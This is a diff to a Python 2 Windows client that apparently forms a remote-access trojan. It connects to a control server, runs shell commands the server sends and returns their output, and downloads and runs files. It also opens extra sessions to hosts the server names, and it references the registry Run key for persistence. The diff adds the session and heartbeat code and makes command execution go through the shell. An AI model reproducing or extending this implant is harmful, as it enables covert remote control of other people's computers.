@@ -10,6 +10,8 @@ import os
 import subprocess
 import data_pb2
 import _winreg
+from threading import Thread
+from time import sleep
 
 SERVER_ADDRESS = "localhost"
 PORT = 8081
@@ -18,13 +20,34 @@ MAX_RANDOM = 1000
 MY_CHAR = 27
 CHAR_ENTER = 13
 REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
+TIMEOUT = 60
 my_socket = None
+
+
+def threaded_function(soc):
+    un_success = 0
+    while True:
+        try:
+            soc.send("1")
+            sleep(TIMEOUT)
+        except Exception as e:
+            un_success += 1
+            print 'un_success', un_success
+        if un_success > 2:
+            print "closed the session"
+            return
+
+
+class ServerSession():
+    def __init__(self, soc, func):
+        self.thread = Thread(target=func, args=(soc,))
+        self.thread.start()
 
 
 class Handle():
     def __init__(self):
         self.reset_file_data()
+        self.sessions = []
 
     def reset_file_data(self):
         self.file_name = 'try.py'
@@ -34,7 +57,7 @@ class Handle():
 
     def exec_file(self):
         os.system("python " + self.file_name)
-        self.terminate()
+        # self.terminate()
 
     def append_to_file(self, fileTransfer):
         if fileTransfer.id <> self.file_id or self.file_index + 1 is not fileTransfer.index:
@@ -64,36 +87,51 @@ class Handle():
             print 'id:', d.clientReq.id
         if d.WhichOneof("Msg") == 'serverReq':
             if d.serverReq.WhichOneof("Type") == 'killYourself':
-                self.terminate()
+                self.terminate(d.serverReq.killYourself.status)
             if d.serverReq.WhichOneof("Type") == 'cmdCommand':
                 self.exec_command(d.serverReq.id, d.serverReq.cmdCommand)
             if d.serverReq.WhichOneof("Type") == "fileStart":
                 self.start_get_file(d.serverReq.fileStart)
             if d.serverReq.WhichOneof("Type") == "fileTransfer":
                 self.append_to_file(d.serverReq.fileTransfer)
+            if d.serverReq.WhichOneof("Type") == "openSession":
+                self.openSession(d.serverReq.openSession)
         if d.WhichOneof("Msg") == "serverRsp":
             pass
 
     def say_hello(self):
         d = data_pb2.TData()
         d.clientReq.id = random.randint(1, MAX_RANDOM)
-        d.clientReq.clientStart.ip = socket.gethostbyname(socket.gethostname())
+        d.clientReq.clientStart.ip = my_socket.getsockname()[0]
+        d.clientReq.clientStart.port = my_socket.getsockname()[1]
         my_socket.send(d.SerializeToString())
 
-    def terminate(self):
-        sys.exit(0)
+    def terminate(self, status):
+        print "----------------- goodbye!!", my_socket.getsockname(), "-----------------"
+        sys.exit(status)
 
     def exec_command(self, id, cmdCommand):
         d = data_pb2.TData()
         d.clientRsp.id = id
         d.clientRsp.cmdCommandResult.result = ""
         try:
-            d.clientRsp.cmdCommandResult.result = subprocess.check_output(cmdCommand.cmd.split())
+            output = subprocess.Popen([cmdCommand.cmd.split()], stdout=subprocess.PIPE, shell=True)
+            result = output.stdout.read()
+            d.clientRsp.cmdCommandResult.result = result
             d.clientRsp.status = data_pb2.RESULT_OK
         except Exception as ex:
             d.clientRsp.status = data_pb2.ERROR_EXEC
 
         my_socket.send(d.SerializeToString())
+
+    def openSession(self, openSession):
+        print "openSession"
+        try:
+            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soc.connect((openSession.ip, openSession.port))
+            self.sessions.append(ServerSession(soc, threaded_function))
+        except Exception as ex:
+            print ex.message
 
 
 def persistent(name, value):
@@ -127,6 +165,7 @@ def main():
 
         handle = Handle()
         handle.say_hello()
+        print my_socket.getsockname()
         msg = ''
         while True:
             # ----------send data----------
